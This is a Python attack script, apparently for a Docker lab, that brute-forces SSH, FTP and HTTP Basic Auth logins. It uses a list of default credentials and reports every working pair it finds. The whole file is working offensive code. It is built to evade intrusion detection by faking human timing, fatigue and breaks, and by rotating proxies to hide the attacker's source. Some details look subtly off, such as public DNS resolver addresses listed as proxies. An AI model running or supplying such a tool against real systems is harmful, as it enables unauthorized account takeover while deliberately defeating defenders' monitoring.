#!/usr/bin/env python3
"""
Advanced Stealth Brute Force with Multi-Layer IDS Evasion
Educational/Research purposes only

Combines:
- Human behavioral patterns (timing, fatigue, interruptions)
- Proxy rotation with health checks
- Protocol-level evasion techniques
- Statistical anti-detection measures
"""

import time
import random
import socket
import requests
import sqlite3
import paramiko
import ftplib
import base64
import json
import numpy as np
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class CognitiveState(Enum):
    FOCUSED = "focused"
    DISTRACTED = "distracted" 
    TIRED = "tired"
    INTERRUPTED = "interrupted"

@dataclass
class AttackerProfile:
    """Human-like attacker behavioral profile"""
    name: str
    base_attempt_interval: float  # seconds between attempts
    fatigue_factor: float         # how quickly they get tired
    interruption_probability: float  # chance of taking breaks
    persistence_level: float      # likelihood to continue after failures
    skill_level: float           # affects error rates and timing
    max_session_duration: int    # minutes before mandatory break

class AdvancedStealthBruteForcer:
    def __init__(self, target_ip: str, target_port: int, protocol: str = "ssh"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol.lower()
        
        # Behavioral simulation
        self.current_state = CognitiveState.FOCUSED
        self.session_start = datetime.now()
        self.attempts_made = 0
        self.successful_attempts = 0
        self.fatigue_level = 0.0
        
        # Proxy management
        self.current_proxy = None
        self.proxy_blacklist = set()
        self.proxy_pool = []
        
        # Evasion statistics
        self.timing_stats = []
        self.evasion_log = []
        
        # Human profiles
        self.profiles = {
            "script_kiddie": AttackerProfile(
                name="Script Kiddie",
                base_attempt_interval=20.0,  # Faster for testing
                fatigue_factor=0.8,
                interruption_probability=0.05,  # Less interruptions
                persistence_level=0.6,
                skill_level=0.3,
                max_session_duration=45
            ),
            "experienced_hacker": AttackerProfile(
                name="Experienced Hacker", 
                base_attempt_interval=30.0,  # Faster for testing
                fatigue_factor=0.4,
                interruption_probability=0.02,  # Less interruptions
                persistence_level=0.9,
                skill_level=0.8,
                max_session_duration=180
            ),
            "automated_tool": AttackerProfile(
                name="Automated Tool (Humanized)",
                base_attempt_interval=15.0,  # Faster for testing
                fatigue_factor=0.2,
                interruption_probability=0.01,  # Less interruptions
                persistence_level=0.95,
                skill_level=0.9,
                max_session_duration=300
            )
        }
        
        self.active_profile = self.profiles["experienced_hacker"]
        
        # Credentials to test
        self.credentials = [
            ("root", "password"), ("root", "toor"), ("root", "root"),
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("user", "user"), ("test", "test"), ("guest", "guest"),
            ("administrator", "administrator"), ("ubuntu", "ubuntu"),
            ("pi", "raspberry"), ("oracle", "oracle"), ("postgres", "postgres")
        ]
        
    def log_evasion_technique(self, technique: str, details: str = ""):
        """Log evasion techniques used for analysis"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'technique': technique,
            'details': details,
            'cognitive_state': self.current_state.value,
            'fatigue_level': self.fatigue_level
        }
        self.evasion_log.append(entry)
        
    def calculate_human_delay(self) -> float:
        """Calculate realistic human timing with cognitive factors"""
        base_delay = self.active_profile.base_attempt_interval
        
        # Apply cognitive state modifiers
        state_multipliers = {
            CognitiveState.FOCUSED: 1.0,
            CognitiveState.DISTRACTED: 1.8,
            CognitiveState.TIRED: 2.5,
            CognitiveState.INTERRUPTED: 4.0
        }
        
        # Apply fatigue (increases over time)
        fatigue_multiplier = 1.0 + (self.fatigue_level * self.active_profile.fatigue_factor)
        
        # Base calculation
        modified_delay = base_delay * state_multipliers[self.current_state] * fatigue_multiplier
        
        # Add human variability using lognormal distribution
        variability = np.random.lognormal(mean=0, sigma=0.4)
        final_delay = modified_delay * variability
        
        # Ensure minimum and maximum bounds (faster for testing)
        final_delay = max(8.0, min(final_delay, 45.0))
        
        self.log_evasion_technique(
            "Human Timing Calculation",
            f"Base: {base_delay}s, State: {self.current_state.value}, "
            f"Fatigue: {self.fatigue_level:.2f}, Final: {final_delay:.1f}s"
        )
        
        return final_delay
        
    def update_cognitive_state(self):
        """Update attacker's cognitive state based on session progress"""
        session_duration = (datetime.now() - self.session_start).total_seconds() / 60
        
        # Increase fatigue over time
        self.fatigue_level = min(1.0, session_duration / self.active_profile.max_session_duration)
        
        # State transition probabilities
        if session_duration > self.active_profile.max_session_duration * 0.8:
            self.current_state = CognitiveState.TIRED
        elif random.random() < self.active_profile.interruption_probability:
            self.current_state = CognitiveState.INTERRUPTED
        elif random.random() < 0.1:  # 10% chance of distraction
            self.current_state = CognitiveState.DISTRACTED
        else:
            self.current_state = CognitiveState.FOCUSED
            
    def simulate_break(self):
        """Simulate realistic human break patterns"""
        if self.current_state == CognitiveState.INTERRUPTED:
            # Long break (phone call, bathroom, etc.) - Faster for testing
            break_duration = random.uniform(30, 90)  # 30 seconds-1.5 minutes
            break_type = "Extended interruption"
        elif self.fatigue_level > 0.7:
            # Fatigue break - Faster for testing
            break_duration = random.uniform(60, 180)  # 1-3 minutes  
            break_type = "Fatigue break"
        else:
            # Short thinking break - Faster for testing
            break_duration = random.uniform(10, 30)   # 10-30 seconds
            break_type = "Reflection pause"
            
        self.log_evasion_technique(
            "Human Break Simulation",
            f"Type: {break_type}, Duration: {break_duration/60:.1f} minutes"
        )
        
        print(f"  🧠 Taking {break_type}: {break_duration/60:.1f} minutes")
        time.sleep(break_duration)
        
        # Reset some fatigue after break
        if break_duration > 600:  # Long break
            self.fatigue_level *= 0.6
            self.current_state = CognitiveState.FOCUSED
            
    def fetch_proxy_pool(self) -> List[Dict]:
        """Fetch fresh proxy list with health checks"""
        print("🔄 Fetching proxy pool...")
        
        try:
            # Multiple proxy sources for redundancy
            proxy_sources = [
                "https://www.proxy-list.download/api/v1/get?type=http",
                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            ]
            
            proxies = []
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ])
            }
            
            # Simple fallback proxy list for testing
            fallback_proxies = [
                "8.8.8.8:80", "1.1.1.1:80", "208.67.222.222:80"
            ]
            
            for proxy_str in fallback_proxies:
                ip, port = proxy_str.split(':')
                proxy = {
                    'ip': ip,
                    'port': int(port),
                    'protocol': 'http',
                    'proxy_string': f"http://{ip}:{port}",
                    'tested': False,
                    'working': False
                }
                proxies.append(proxy)
                
            self.log_evasion_technique("Proxy Pool Fetched", f"Count: {len(proxies)}")
            return proxies
            
        except Exception as e:
            print(f"⚠️  Proxy fetch failed: {e}")
            return []
            
    def test_proxy(self, proxy: Dict) -> bool:
        """Test proxy functionality and response time"""
        try:
            proxy_url = proxy['proxy_string']
            proxies_dict = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # Quick connectivity test
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxies_dict,
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0 (compatible; connectivity-test)'}
            )
            
            if response.status_code == 200:
                proxy['working'] = True
                proxy['response_time'] = response.elapsed.total_seconds()
                self.log_evasion_technique("Proxy Validated", f"IP: {proxy['ip']}")
                return True
                
        except Exception:
            pass
            
        proxy['working'] = False
        self.proxy_blacklist.add(proxy['proxy_string'])
        return False
        
    def rotate_proxy(self):
        """Intelligent proxy rotation with health checks"""
        if not self.proxy_pool:
            self.proxy_pool = self.fetch_proxy_pool()
            
        # Filter out blacklisted proxies
        available_proxies = [
            p for p in self.proxy_pool 
            if p['proxy_string'] not in self.proxy_blacklist and not p.get('tested', False)
        ]
        
        if not available_proxies:
            print("⚠️  No available proxies, refreshing pool...")
            self.proxy_pool = self.fetch_proxy_pool()
            available_proxies = self.proxy_pool
            
        if available_proxies:
            candidate = random.choice(available_proxies)
            candidate['tested'] = True
            
            if self.test_proxy(candidate):
                self.current_proxy = candidate
                print(f"  🔄 Rotated to proxy: {candidate['ip']}")
                return True
            else:
                print(f"  ❌ Proxy {candidate['ip']} failed validation")
                return self.rotate_proxy()  # Try another
                
        return False
        
    def attempt_ssh_login(self, username: str, password: str) -> bool:
        """Advanced SSH login attempt with evasion"""
        try:
            # Create SSH client with custom configuration
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Configure SSH client for evasion
            ssh_client._transport = None
            
            # Connection attempt with realistic timeout
            connect_timeout = random.uniform(10, 30)
            
            ssh_client.connect(
                hostname=self.target_ip,
                port=self.target_port,
                username=username,
                password=password,
                timeout=connect_timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Test the connection
            stdin, stdout, stderr = ssh_client.exec_command('whoami')
            result = stdout.read().decode().strip()
            
            ssh_client.close()
            
            if result:
                self.log_evasion_technique("SSH Success", f"{username}:{password}")
                return True
                
        except paramiko.AuthenticationException:
            self.log_evasion_technique("SSH Auth Failed", f"{username}:{password}")
        except Exception as e:
            self.log_evasion_technique("SSH Error", f"{username}:{password} - {str(e)}")
            
        return False
        
    def attempt_ftp_login(self, username: str, password: str) -> bool:
        """Advanced FTP login attempt with evasion"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target_ip, self.target_port, timeout=30)
            ftp.login(username, password)
            
            # Test directory listing
            ftp.nlst()
            ftp.quit()
            
            self.log_evasion_technique("FTP Success", f"{username}:{password}")
            return True
            
        except ftplib.error_perm:
            self.log_evasion_technique("FTP Auth Failed", f"{username}:{password}")
        except Exception as e:
            self.log_evasion_technique("FTP Error", f"{username}:{password} - {str(e)}")
            
        return False
        
    def attempt_http_login(self, username: str, password: str) -> bool:
        """Advanced HTTP Basic Auth attempt with evasion"""
        try:
            # Prepare authentication
            auth_string = f"{username}:{password}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Realistic headers
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36'
                ]),
                'Authorization': f'Basic {auth_b64}',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Setup session with proxy if available
            session = requests.Session()
            if self.current_proxy and self.current_proxy.get('working'):
                session.proxies = {
                    'http': self.current_proxy['proxy_string'],
                    'https': self.current_proxy['proxy_string']
                }
            
            response = session.get(
                f"http://{self.target_ip}:{self.target_port}/",
                headers=headers,
                timeout=30,
                allow_redirects=False
            )
            
            if response.status_code == 200:
                self.log_evasion_technique("HTTP Success", f"{username}:{password}")
                return True
            elif response.status_code in [401, 403]:
                self.log_evasion_technique("HTTP Auth Failed", f"{username}:{password}")
            else:
                self.log_evasion_technique("HTTP Unexpected", f"{username}:{password} - {response.status_code}")
                
        except Exception as e:
            self.log_evasion_technique("HTTP Error", f"{username}:{password} - {str(e)}")
            
        return False
        
    def execute_stealth_attack(self):
        """Main attack execution with advanced evasion"""
        print("🎯 Advanced Stealth Brute Force Attack Starting")
        print(f"Target: {self.target_ip}:{self.target_port} ({self.protocol})")
        print(f"Profile: {self.active_profile.name}")
        print("=" * 60)
        
        # Initialize proxy pool
        self.proxy_pool = self.fetch_proxy_pool()
        
        attack_methods = {
            'ssh': self.attempt_ssh_login,
            'ftp': self.attempt_ftp_login,
            'http': self.attempt_http_login
        }
        
        attack_method = attack_methods.get(self.protocol)
        if not attack_method:
            print(f"❌ Unsupported protocol: {self.protocol}")
            return
            
        successful_credentials = []
        
        for i, (username, password) in enumerate(self.credentials, 1):
            # Update behavioral state
            self.update_cognitive_state()
            self.attempts_made += 1
            
            print(f"\n🔍 Attempt {i}/{len(self.credentials)}: {username}:{password}")
            print(f"   State: {self.current_state.value} | Fatigue: {self.fatigue_level:.2f}")
            
            # Proxy rotation every 3-5 attempts
            if i % random.randint(3, 5) == 0:
                self.rotate_proxy()
                
            # Simulate break if needed
            if (self.current_state == CognitiveState.INTERRUPTED or 
                (self.fatigue_level > 0.8 and random.random() < 0.3)):
                self.simulate_break()
                
            # Calculate human-like delay
            delay = self.calculate_human_delay()
            print(f"   ⏱️  Human delay: {delay:.1f}s")
            
            # Execute the attack
            start_time = time.time()
            
            try:
                if attack_method(username, password):
                    print(f"   ✅ SUCCESS! Found: {username}:{password}")
                    successful_credentials.append((username, password))
                    self.successful_attempts += 1
                else:
                    print(f"   ❌ Failed: {username}:{password}")
                    
            except KeyboardInterrupt:
                print("\n⚠️  Attack interrupted by user")
                break
                
            # Record timing for analysis
            attempt_duration = time.time() - start_time
            self.timing_stats.append(attempt_duration)
            
            # Human-like delay before next attempt
            time.sleep(delay)
            
        # Generate final report
        self.generate_stealth_report(successful_credentials)
        
    def generate_stealth_report(self, successful_credentials: List[Tuple[str, str]]):
        """Generate comprehensive evasion analysis report"""
        duration = (datetime.now() - self.session_start).total_seconds()
        
        report = {
            'attack_summary': {
                'target': f"{self.target_ip}:{self.target_port}",
                'protocol': self.protocol,
                'duration_minutes': duration / 60,
                'total_attempts': self.attempts_made,
                'successful_attempts': self.successful_attempts,
                'success_rate': self.successful_attempts / self.attempts_made if self.attempts_made > 0 else 0,
                'profile_used': self.active_profile.name
            },
            'successful_credentials': successful_credentials,
            'evasion_techniques': len(self.evasion_log),
            'timing_analysis': {
                'mean_delay': np.mean(self.timing_stats) if self.timing_stats else 0,
                'std_delay': np.std(self.timing_stats) if self.timing_stats else 0,
                'min_delay': min(self.timing_stats) if self.timing_stats else 0,
                'max_delay': max(self.timing_stats) if self.timing_stats else 0
            },
            'evasion_log': self.evasion_log[-10:]  # Last 10 entries
        }
        
        # Save detailed report
        report_file = f"stealth_attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\n{'='*60}")
        print("🎯 STEALTH ATTACK COMPLETED")
        print(f"{'='*60}")
        print(f"Duration: {duration/60:.1f} minutes")
        print(f"Attempts: {self.attempts_made}")
        print(f"Success Rate: {report['attack_summary']['success_rate']*100:.1f}%")
        print(f"Evasion Techniques Used: {len(self.evasion_log)}")
        
        if successful_credentials:
            print("\n✅ SUCCESSFUL CREDENTIALS:")
            for username, password in successful_credentials:
                print(f"   • {username}:{password}")
        else:
            print("\n❌ No successful credentials found")
            
        print(f"\n📊 Detailed report saved: {report_file}")
        
        return report

def main():
    """Main execution function"""
    print("Advanced Stealth Brute Force with IDS Evasion")
    print("Educational/Research purposes only\n")
    
    # Configuration for Docker lab
    target_ip = "172.18.0.2"  # Docker target
    
    # Test SSH only for faster testing
    protocols = ["ssh"]  # Only SSH for quick test
    ports = {"ssh": 22, "ftp": 21, "http": 80}
    
    for protocol in protocols:
        print(f"\n{'='*80}")
        print(f"Testing {protocol.upper()} Protocol")
        print(f"{'='*80}")
        
        attacker = AdvancedStealthBruteForcer(
            target_ip=target_ip,
            target_port=ports[protocol], 
            protocol=protocol
        )
        
        try:
            attacker.execute_stealth_attack()
        except KeyboardInterrupt:
            print(f"\n⚠️  {protocol.upper()} attack interrupted")
            continue

if __name__ == "__main__":
    main()